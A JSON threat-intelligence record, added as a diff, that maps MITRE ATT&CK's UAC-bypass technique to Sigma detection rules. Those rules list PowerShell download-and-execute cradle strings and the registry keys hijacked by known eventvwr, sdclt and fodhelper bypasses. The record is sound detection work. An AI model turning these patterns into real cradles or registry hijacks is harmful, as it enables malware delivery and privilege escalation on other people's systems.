@@ -1,0 +1,1220 @@
+{
+    "id": "T1548.002",
+    "name": "Bypass User Account Control",
+    "description": "Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action. (Citation: TechNet How UAC Works)\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model](T1559.001) objects without prompting the user through the UAC notification box. (Citation: TechNet Inside UAC) (Citation: MSDN COM Elevation) An example of this is use of [Rundll32](T1218.011) to load a specifically crafted DLL which loads an auto-elevated [Component Object Model](T1559.001) object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows)\nMany methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n* `eventvwr.exe` can auto-elevate and execute a specified binary or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit)\nAnother bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.(Citation: SANS UAC Bypass)",
+    "platforms": "Windows",
+    "kill_chain_phases": "Privilege Escalation, Defense Evasion",
+    "data_sources": "Process: Process Metadata, Process: Process Creation, Windows Registry: Windows Registry Key Modification, Command: Command Execution",
+    "detection": "There are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Monitor process API calls for behavior that may be indicative of [Process Injection](T1055) and unusual loaded DLLs through [DLL Search Order Hijacking](T1574.001), which indicate attempts to gain access to higher privileged processes.\nSome UAC bypass methods rely on modifying specific, user-accessible Registry settings. For example:\n* The `eventvwr.exe` bypass uses the `[HKEY_CURRENT_USER]SoftwareClassesmscfileshellopencommand` Registry key.(Citation: enigma0x3 Fileless UAC Bypass)\n* The `sdclt.exe` bypass uses the `[HKEY_CURRENT_USER]SoftwareMicrosoftWindowsCurrentVersionApp Pathscontrol.exe` and `[HKEY_CURRENT_USER]SoftwareClassesexefileshellrunascommandisolatedCommand` Registry keys.(Citation: enigma0x3 sdclt app paths)(Citation: enigma0x3 sdclt bypass)\nAnalysts should monitor these Registry settings for unauthorized changes.",
+    "url": "https://attack.mitre.org/techniques/T1548/002",
+    "enrichments": {
+        "attack_rule_map": [
+            {
+                "tech_id": "T1548.002",
+                "atomic_attack_guid": "2b61977b-ae2d-4ae4-89cb-5c36c89586be",
+                "atomic_attack_name": "WinPwn - UAC Bypass DccwBypassUAC technique",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "PowerShell Download and Execution Cradles",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_iex.yml",
+                        "remote_content": "title: PowerShell Download and Execution Cradles\nid: 85b0b087-eddf-4a2b-b033-d771fa2b9775\nstatus: test\ndescription: Detects PowerShell download and execution cradles.\nreferences:\n    - https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd\n    - https://labs.withsecure.com/publications/fin7-target-veeam-servers\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-24\nmodified: 2023-05-04\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_download:\n        CommandLine|contains:\n            - '.DownloadString('\n            - '.DownloadFile('\n            - 'Invoke-WebRequest '\n            - 'iwr '\n    selection_iex:\n        CommandLine|contains:\n            - ';iex $'\n            - '| IEX'\n            - '|IEX '\n            - 'I`E`X'\n            - 'I`EX'\n            - 'IE`X'\n            - 'iex '\n            - 'IEX ('\n            - 'IEX('\n            - 'Invoke-Expression'\n    condition: all of selection_*\nfalsepositives:\n    - Some PowerShell installers were seen using similar combinations. Apply filters accordingly\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "Suspicious PowerShell Invocations - Specific - ProcessCreation",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_invocation_specific.yml",
+                        "remote_content": "title: Suspicious PowerShell Invocations - Specific - ProcessCreation\nid: 536e2947-3729-478c-9903-745aaffe60d2\nrelated:\n    - id: fce5f582-cc00-41e1-941a-c6fabf0fdb8c\n      type: obsolete\n    - id: ae7fbf8e-f3cb-49fd-8db4-5f3bed522c71\n      type: similar\n    - id: 8ff28fdd-e2fa-4dfa-aeda-ef3d61c62090\n      type: similar\nstatus: test\ndescription: Detects suspicious PowerShell invocation command parameters\nreferences:\n    - Internal Research\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-01-05\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_convert_b64:\n        CommandLine|contains|all:\n            - '-nop'\n            - ' -w '\n            - 'hidden'\n            - ' -c '\n            - '[Convert]::FromBase64String'\n    selection_iex:\n        CommandLine|contains|all:\n            - ' -w '\n            - 'hidden'\n            - '-noni'\n            - '-nop'\n            - ' -c '\n            - 'iex'\n            - 'New-Object'\n    selection_enc:\n        CommandLine|contains|all:\n            - ' -w '\n            - 'hidden'\n            - '-ep'\n            - 'bypass'\n            - '-Enc'\n    selection_reg:\n        CommandLine|contains|all:\n            - 'powershell'\n            - 'reg'\n            - 'add'\n            - '\\software\\'\n    selection_webclient:\n        CommandLine|contains|all:\n            - 'bypass'\n            - '-noprofile'\n            - '-windowstyle'\n            - 'hidden'\n            - 'new-object'\n            - 'system.net.webclient'\n            - '.download'\n    selection_iex_webclient:\n        CommandLine|contains|all:\n            - 'iex'\n            - 'New-Object'\n            - 'Net.WebClient'\n            - '.Download'\n    filter_chocolatey:\n        CommandLine|contains:\n            - \"(New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1\"\n            - 'Write-ChocolateyWarning'\n    condition: 1 of selection_* and not 1 of filter_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Suspicious PowerShell Download and Execute Pattern",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_susp_download_patterns.yml",
+                        "remote_content": "title: Suspicious PowerShell Download and Execute Pattern\nid: e6c54d94-498c-4562-a37c-b469d8e9a275\nrelated:\n    - id: 3b6ab547-8ec2-4991-b9d2-2b06702a48d7\n      type: derived\nstatus: test\ndescription: Detects suspicious PowerShell download patterns that are often used in malicious scripts, stagers or downloaders (make sure that your backend applies the strings case-insensitive)\nreferences:\n    - https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70\n    - https://www.trendmicro.com/en_us/research/22/j/lv-ransomware-exploits-proxyshell-in-attack.html\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-02-28\nmodified: 2022-03-01\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains: # make sure that your backend applies the strings case-insensitive\n            - 'IEX ((New-Object Net.WebClient).DownloadString'\n            - 'IEX (New-Object Net.WebClient).DownloadString'\n            - 'IEX((New-Object Net.WebClient).DownloadString'\n            - 'IEX(New-Object Net.WebClient).DownloadString'\n            - ' -command (New-Object System.Net.WebClient).DownloadFile('\n            - ' -c (New-Object System.Net.WebClient).DownloadFile('\n    condition: selection\nfalsepositives:\n    - Software installers that pull packages from remote systems and execute them\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "PowerShell Web Download",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_cradles.yml",
+                        "remote_content": "title: PowerShell Web Download\nid: 6e897651-f157-4d8f-aaeb-df8151488385\nstatus: test\ndescription: Detects suspicious ways to download files or content using PowerShell\nreferences:\n    - https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-24\nmodified: 2023-01-05\ntags:\n    - attack.command-and-control\n    - attack.execution\n    - attack.t1059.001\n    - attack.t1105\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - '.DownloadString('\n            - '.DownloadFile('\n            - 'Invoke-WebRequest '\n            - 'iwr '\n    condition: selection\nfalsepositives:\n    - Scripts or tools that download files\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "PowerShell Download Pattern",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_patterns.yml",
+                        "remote_content": "title: PowerShell Download Pattern\nid: 3b6ab547-8ec2-4991-b9d2-2b06702a48d7\nrelated:\n    - id: e6c54d94-498c-4562-a37c-b469d8e9a275\n      type: derived\nstatus: test\ndescription: Detects a Powershell process that contains download commands in its command line string\nreferences:\n    - https://blog.redteam.pl/2020/06/black-kingdom-ransomware.html\n    - https://lab52.io/blog/winter-vivern-all-summer/\n    - https://hatching.io/blog/powershell-analysis/\nauthor: Florian Roth (Nextron Systems), oscd.community, Jonhnathan Ribeiro\ndate: 2019-01-16\nmodified: 2023-01-26\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n              - '\\powershell.exe'\n              - '\\pwsh.exe'\n        - OriginalFileName:\n              - 'PowerShell.EXE'\n              - 'pwsh.dll'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'new-object'\n            - 'net.webclient).'\n            - 'download'\n        CommandLine|contains:\n            - 'string('\n            - 'file('\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Usage Of Web Request Commands And Cmdlets",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_web_request_cmd_and_cmdlets.yml",
+                        "remote_content": "title: Usage Of Web Request Commands And Cmdlets\nid: 9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d\nrelated:\n    - id: 1139d2e2-84b1-4226-b445-354492eba8ba\n      type: similar\n    - id: f67dbfce-93bc-440d-86ad-a95ae8858c90\n      type: obsolete\n    - id: cd5c8085-4070-4e22-908d-a5b3342deb74\n      type: obsolete\nstatus: test\ndescription: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via CommandLine\nreferences:\n    - https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/\n    - https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell\n    - https://learn.microsoft.com/en-us/powershell/module/bitstransfer/add-bitsfile?view=windowsserver2019-ps\nauthor: James Pemberton / @4A616D6573, Endgame, JHasenbusch, oscd.community, Austin Songer @austinsonger\ndate: 2019-10-24\nmodified: 2023-01-10\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - '[System.Net.WebRequest]::create'\n            - 'curl '\n            - 'Invoke-RestMethod'\n            - 'Invoke-WebRequest'\n            - 'iwr '\n            - 'Net.WebClient'\n            - 'Resume-BitsTransfer'\n            - 'Start-BitsTransfer'\n            - 'wget '\n            - 'WinHttp.WinHttpRequest'\n    condition: selection\nfalsepositives:\n    - Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer.\nlevel: medium\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Any Powershell DownloadString",
+                        "rule_link": "https://research.splunk.com/endpoint/4d015ef2-7adf-11eb-95da-acde48001122/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1548.002",
+                "atomic_attack_guid": "f7a35090-6f7f-4f64-bb47-d657bf5b10c1",
+                "atomic_attack_name": "Bypass UAC by Mocking Trusted Directories",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Suspicious Copy From or To System Directory",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_copy_system_dir.yml",
+                        "remote_content": "title: Suspicious Copy From or To System Directory\nid: fff9d2b7-e11c-4a69-93d3-40ef66189767\nrelated:\n    - id: 855bc8b5-2ae8-402e-a9ed-b889e6df1900\n      type: derived\nstatus: test\ndescription: |\n    Detects a suspicious copy operation that tries to copy a program from system (System32, SysWOW64, WinSxS) directories to another on disk.\n    Often used to move LOLBINs such as 'certutil' or 'desktopimgdownldr' to a different location with a different name in order to bypass detections based on locations.\nreferences:\n    - https://www.hybrid-analysis.com/sample/8da5b75b6380a41eee3a399c43dfe0d99eeefaa1fd21027a07b1ecaa4cd96fdd?environmentId=120\n    - https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html\n    - https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/\nauthor: Florian Roth (Nextron Systems), Markus Neis, Tim Shelton (HAWK.IO), Nasreddine Bencherchali (Nextron Systems)\ndate: 2020-07-03\nmodified: 2023-08-29\ntags:\n    - attack.defense-evasion\n    - attack.t1036.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_cmd:\n        Image|endswith: '\\cmd.exe'\n        CommandLine|contains: 'copy '\n    selection_pwsh:\n        Image|endswith:\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n        CommandLine|contains:\n            - 'copy-item'\n            - ' copy '\n            - 'cpi '\n            - ' cp '\n    selection_other:\n        - Image|endswith:\n              - '\\robocopy.exe'\n              - '\\xcopy.exe'\n        - OriginalFileName:\n              - 'robocopy.exe'\n              - 'XCOPY.EXE'\n    target:\n        CommandLine|contains:\n            - '\\System32'\n            - '\\SysWOW64'\n            - '\\WinSxS'\n    condition: 1 of selection_* and target\nfalsepositives:\n    - Depend on scripts and administrative tools used in the monitored environment (For example an admin scripts like https://www.itexperience.net/sccm-batch-files-and-32-bits-processes-on-64-bits-os/)\n    - When cmd.exe and xcopy.exe are called directly #  C:\\Windows\\System32\\cmd.exe /c copy file1 file2\n    - When the command contains the keywords but not in the correct order\nlevel: medium\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Windows Password Managers Discovery",
+                        "rule_link": "https://research.splunk.com/endpoint/a3b3bc96-1c4f-4eba-8218-027cac739a48/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1548.002",
+                "atomic_attack_guid": "58f641ea-12e3-499a-b684-44dee46bd182",
+                "atomic_attack_name": "Bypass UAC using Fodhelper",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Suspicious Reg Add Open Command",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_reg_open_command.yml",
+                        "remote_content": "title: Suspicious Reg Add Open Command\nid: dd3ee8cc-f751-41c9-ba53-5a32ed47e563\nstatus: test\ndescription: Threat actors performed dumping of SAM, SECURITY and SYSTEM registry hives using DelegateExecute key\nreferences:\n    - https://thedfirreport.com/2021/12/13/diavol-ransomware/\nauthor: frack113\ndate: 2021-12-20\nmodified: 2022-12-25\ntags:\n    - attack.credential-access\n    - attack.t1003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_1:\n        CommandLine|contains|all:\n            - 'reg'\n            - 'add'\n            - 'hkcu\\software\\classes\\ms-settings\\shell\\open\\command'\n            - '/ve '\n            - '/d'\n    selection_2:\n        CommandLine|contains|all:\n            - 'reg'\n            - 'add'\n            - 'hkcu\\software\\classes\\ms-settings\\shell\\open\\command'\n            - '/v'\n            - 'DelegateExecute'\n    selection_3:\n        CommandLine|contains|all:\n            - 'reg'\n            - 'delete'\n            - 'hkcu\\software\\classes\\ms-settings'\n    condition: 1 of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    }
+                ]
+            }
+        ],
+        "cycat": {
+            "cycat": {
+                "cycat_related_uuids": [
+                    "503d581c-7df0-4bbe-b9be-5840c0ecc1fc",
+                    "41bb431f-56d8-4691-bb56-ed34e390906f",
+                    "b697e69c-746f-4a86-9f59-7bfff8eab881",
+                    "7fff6773-2baa-46de-a24a-b6eec1aba2d1",
+                    "5f9db380-ea57-4d1e-beab-8a2d33397e93",
+                    "152f3630-77c1-4284-bcc0-4cc68ab2f6e7",
+                    "7c81fec3-1c1d-43b0-996a-46753041b1b6",
+                    "cd951fdc-4b2f-47f5-ba99-a33bf61e3770",
+                    "4ac47ed3-44c2-4b1f-9d51-bf46e8914126",
+                    "d797268e-28a9-49a7-b9a8-2f5039011c5c",
+                    "724ea201-6514-4f38-9739-e5973c34f49a",
+                    "38cf8340-461b-4857-bf99-23a41f772b18",
+                    "d38d2fa4-98e6-4a24-aff1-410b0c9ad177",
+                    "1ca6bd18-0ba0-44ca-851c-92ed89a61085",
+                    "bdc8918e-a1d5-49d1-9db7-ea0fd91aa2ae",
+                    "ad92e3f9-7eb6-460e-96b1-582b0ccbb980",
+                    "e66779cc-383e-4224-a3a4-267eeb585c40",
+                    "a743ceba-c771-4d75-97eb-8a90f7f4844c",
+                    "5b872a46-3b90-45c1-8419-f675db8053aa",
+                    "89a9a0e0-f61a-42e5-8957-b1479565a658",
+                    "62ed5b55-f991-406a-85d9-e8e8fdf18789",
+                    "68578b43-65df-4f81-9a9b-92f32711a951",
+                    "fb3722e4-1a06-46b6-b772-253e2e7db933",
+                    "40f9af16-589d-4984-b78d-8c2aec023197",
+                    "3268b746-88d8-4cd3-bffc-30077d02c787",
+                    "0058b9e5-bcd7-40d4-9205-95ca5a16d7b2",
+                    "7f741dcf-fc22-4759-87b4-9ae8376676a2",
+                    "48ea844d-19b1-4642-944e-fe39c2cc1fec",
+                    "155dbf56-e0a4-4dd0-8905-8a98705045e8",
+                    "3c05e90d-7eba-4324-9972-5d7f711a60a8",
+                    "6597be7b-ac61-4ac8-bef4-d3ec88174853",
+                    "6ea3bf32-9680-422d-9f50-e90716b12a66",
+                    "1e53dd56-8d83-4eb4-a43e-b790a05510aa",
+                    "9ed5959a-c43c-4c59-84e3-d28628429456",
+                    "4cbef972-f347-4170-b62a-8253f6168e6d",
+                    "7a01183d-71a2-46ad-ad5c-acd989ac1793",
+                    "534f2ef7-e8a2-4433-816d-c91bccde289b",
+                    "be344333-921d-4c4d-8bb8-e584cf584780",
+                    "a5ea83a7-05a5-44c1-be2e-addccbbd8c03",
+                    "48437c39-9e5f-47fb-af95-3d663c3f2919",
+                    "39ed3c80-e6a1-431b-9df3-911ac53d08a7",
+                    "4f6c43e2-f989-4ea5-bcd8-843b49a0317c",
+                    "758d96ed-9dd4-4009-9270-65f2c3dd30cc",
+                    "80fc36aa-945e-4181-89f2-2f907ab6775d",
+                    "da2738f2-fadb-4394-afa7-0a0674885afa",
+                    "120d5519-3098-4e1c-9191-2aa61232f073",
+                    "46dd5308-4572-4d12-aa43-8938f0184d4f",
+                    "49f2f17b-b4c8-4172-a68b-d5bf95d05130",
+                    "853e74f9-9392-4935-ad3b-2e8c040dae86",
+                    "4b60e6f2-bf39-47b4-b4ea-398e33cfe253",
+                    "bdd8157d-8e85-4397-bb82-f06cc9c71dbb",
+                    "93a19907-d4f9-4deb-9f91-aac4692776a6"
+                ],
+                "lookup_results": [
+                    {
+                        "uuid": "503d581c-7df0-4bbe-b9be-5840c0ecc1fc",
+                        "lookup_data": {
+                            "description": "Detects an UAC bypass that uses changepk.exe and slui.exe (UACMe 61)",
+                            "raw": "author: Christian Burkard (Nextron Systems)\ndate: 2021/08/23\ndescription: Detects an UAC bypass that uses changepk.exe and slui.exe (UACMe 61)\ndetection:\n  condition: selection\n  selection:\n    Image|endswith: \\changepk.exe\n    IntegrityLevel:\n    - High\n    - System\n    ParentImage|endswith: \\slui.exe\nfalsepositives:\n- Unknown\nid: 503d581c-7df0-4bbe-b9be-5840c0ecc1fc\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://mattharr0ey.medium.com/privilege-escalation-uac-bypass-in-changepk-c40b92818d1b\n- https://github.com/hfiref0x/UACME\n- https://medium.com/falconforce/falconfriday-detecting-uac-bypasses-0xff16-86c2a9107abf\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1548.002\ntitle: UAC Bypass Using ChangePK and SLUI\n",
+                            "sigma:id": "503d581c-7df0-4bbe-b9be-5840c0ecc1fc",
+                            "title": "UAC Bypass Using ChangePK and SLUI",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "41bb431f-56d8-4691-bb56-ed34e390906f",
+                        "lookup_data": {
+                            "description": "Detects the pattern of UAC Bypass using a msconfig GUI hack (UACMe 55)",
+                            "raw": "author: Christian Burkard (Nextron Systems)\ndate: 2021/08/30\ndescription: Detects the pattern of UAC Bypass using a msconfig GUI hack (UACMe 55)\ndetection:\n  condition: selection\n  selection:\n    TargetFilename|endswith: \\AppData\\Local\\Temp\\pkgmgr.exe\n    TargetFilename|startswith: C:\\Users\\\nfalsepositives:\n- Unknown\nid: 41bb431f-56d8-4691-bb56-ed34e390906f\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://github.com/hfiref0x/UACME\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1548.002\ntitle: UAC Bypass Using MSConfig Token Modification - File\n",
+                            "sigma:id": "41bb431f-56d8-4691-bb56-ed34e390906f",
+                            "title": "UAC Bypass Using MSConfig Token Modification - File",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "b697e69c-746f-4a86-9f59-7bfff8eab881",
+                        "lookup_data": {
+                            "description": "Detects the pattern of UAC Bypass using scheduled tasks and variable expansion of cleanmgr.exe (UACMe 34)",
+                            "raw": "author: Christian Burkard (Nextron Systems)\ndate: 2021/08/30\ndescription: Detects the pattern of UAC Bypass using scheduled tasks and variable\n  expansion of cleanmgr.exe (UACMe 34)\ndetection:\n  condition: selection\n  selection:\n    CommandLine|endswith: '\"\\system32\\cleanmgr.exe /autoclean /d C:'\n    IntegrityLevel:\n    - High\n    - System\n    ParentCommandLine: C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule\nfalsepositives:\n- Unknown\nid: b697e69c-746f-4a86-9f59-7bfff8eab881\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://github.com/hfiref0x/UACME\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1548.002\ntitle: UAC Bypass Using Disk Cleanup\n",
+                            "sigma:id": "b697e69c-746f-4a86-9f59-7bfff8eab881",
+                            "title": "UAC Bypass Using Disk Cleanup",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "7fff6773-2baa-46de-a24a-b6eec1aba2d1",
+                        "lookup_data": {
+                            "description": "Detects the pattern of UAC Bypass using NTFS reparse point and wusa.exe DLL hijacking (UACMe 36)",
+                            "raw": "author: Christian Burkard (Nextron Systems)\ndate: 2021/08/30\ndescription: Detects the pattern of UAC Bypass using NTFS reparse point and wusa.exe\n  DLL hijacking (UACMe 36)\ndetection:\n  condition: selection\n  selection:\n    TargetFilename|endswith: \\AppData\\Local\\Temp\\api-ms-win-core-kernel32-legacy-l1.DLL\n    TargetFilename|startswith: C:\\Users\\\nfalsepositives:\n- Unknown\nid: 7fff6773-2baa-46de-a24a-b6eec1aba2d1\nlevel: high\nlogsource:\n  category: file_event\n  product: windows\nmodified: 2022/10/09\nreferences:\n- https://github.com/hfiref0x/UACME\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1548.002\ntitle: UAC Bypass Using NTFS Reparse Point - File\n",
+                            "sigma:id": "7fff6773-2baa-46de-a24a-b6eec1aba2d1",
+                            "title": "UAC Bypass Using NTFS Reparse Point - File",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "5f9db380-ea57-4d1e-beab-8a2d33397e93",
+                        "lookup_data": {
+                            "description": "Detects the pattern of UAC Bypass using Windows Media Player osksupport.dll (UACMe 32)",
+                            "raw": "author: Christian Burkard (Nextron Systems)\ndate: 2021/08/23\ndescription: Detects the pattern of UAC Bypass using Windows Media Player osksupport.dll\n  (UACMe 32)\ndetection:\n  condition: selection\n  selection:\n    Details: Binary Data\n    EventType: SetValue\n    TargetObject|endswith: \\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility\n      Assistant\\Store\\C:\\Program Files\\Windows Media Player\\osk.exe\nfalsepositives:\n- Unknown\nid: 5f9db380-ea57-4d1e-beab-8a2d33397e93\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/03/26\nreferences:\n- https://github.com/hfiref0x/UACME\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1548.002\ntitle: UAC Bypass Using Windows Media Player - Registry\n",
+                            "sigma:id": "5f9db380-ea57-4d1e-beab-8a2d33397e93",
+                            "title": "UAC Bypass Using Windows Media Player - Registry",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "152f3630-77c1-4284-bcc0-4cc68ab2f6e7",
+                        "lookup_data": {
+                            "description": "Detects the shell open key manipulation (exefile and ms-settings) used for persistence and the pattern of UAC Bypass using fodhelper.exe, computerdefaults.exe, slui.exe via registry keys (e.g. UACMe 33 or 62)",
+                            "raw": "author: Christian Burkard (Nextron Systems)\ndate: 2021/08/30\ndescription: Detects the shell open key manipulation (exefile and ms-settings) used\n  for persistence and the pattern of UAC Bypass using fodhelper.exe, computerdefaults.exe,\n  slui.exe via registry keys (e.g. UACMe 33 or 62)\ndetection:\n  condition: selection1 or selection2 or (selection3 and not filter_sel3)\n  filter_sel3:\n    Details: (Empty)\n  selection1:\n    Details|contains: \\Software\\Classes\\{\n    EventType: SetValue\n    TargetObject|endswith: Classes\\ms-settings\\shell\\open\\command\\SymbolicLinkValue\n  selection2:\n    TargetObject|endswith: Classes\\ms-settings\\shell\\open\\command\\DelegateExecute\n  selection3:\n    EventType: SetValue\n    TargetObject|endswith:\n    - Classes\\ms-settings\\shell\\open\\command\\(Default)\n    - Classes\\exefile\\shell\\open\\command\\(Default)\nfalsepositives:\n- Unknown\nid: 152f3630-77c1-4284-bcc0-4cc68ab2f6e7\nlevel: high\nlogsource:\n  category: registry_event\n  product: windows\nmodified: 2022/01/13\nreferences:\n- https://github.com/hfiref0x/UACME\n- https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/\n- https://github.com/RhinoSecurityLabs/Aggressor-Scripts/tree/master/UACBypass\n- https://tria.ge/211119-gs7rtshcfr/behavioral2 [Lokibot sample from Nov 2021]\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1548.002\n- attack.t1546.001\ntitle: Shell Open Registry Keys Manipulation\n",
+                            "sigma:id": "152f3630-77c1-4284-bcc0-4cc68ab2f6e7",
+                            "title": "Shell Open Registry Keys Manipulation",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "7c81fec3-1c1d-43b0-996a-46753041b1b6",
+                        "lookup_data": {
+                            "description": "Detects UAC bypass method using Windows event viewer",
+                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2017/03/19\ndescription: Detects UAC bypass method using Windows event viewer\ndetection:\n  condition: selection\n  selection:\n    TargetObject|endswith: \\mscfile\\shell\\open\\command\n    TargetObject|startswith: HKCU\\\nfalsepositives:\n- Unknown\nid: 7c81fec3-1c1d-43b0-996a-46753041b1b6\nlevel: high\nlogsource:\n  category: registry_set\n  product: windows\nmodified: 2022/11/25\nreferences:\n- https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\n- https://www.hybrid-analysis.com/sample/e122bc8bf291f15cab182a5d2d27b8db1e7019e4e96bb5cdbd1dfe7446f3f51f?environmentId=100\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.privilege_escalation\n- attack.t1548.002\n- car.2019-04-001\ntitle: UAC Bypass via Event Viewer - Registry Set\n",
+                            "sigma:id": "7c81fec3-1c1d-43b0-996a-46753041b1b6",
+                            "title": "UAC Bypass via Event Viewer - Registry Set",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "cd951fdc-4b2f-47f5-ba99-a33bf61e3770",
+                        "lookup_data": {
+                            "description": "Detects Windows Installer service (msiexec.exe) trying to install MSI packages with SYSTEM privilege",
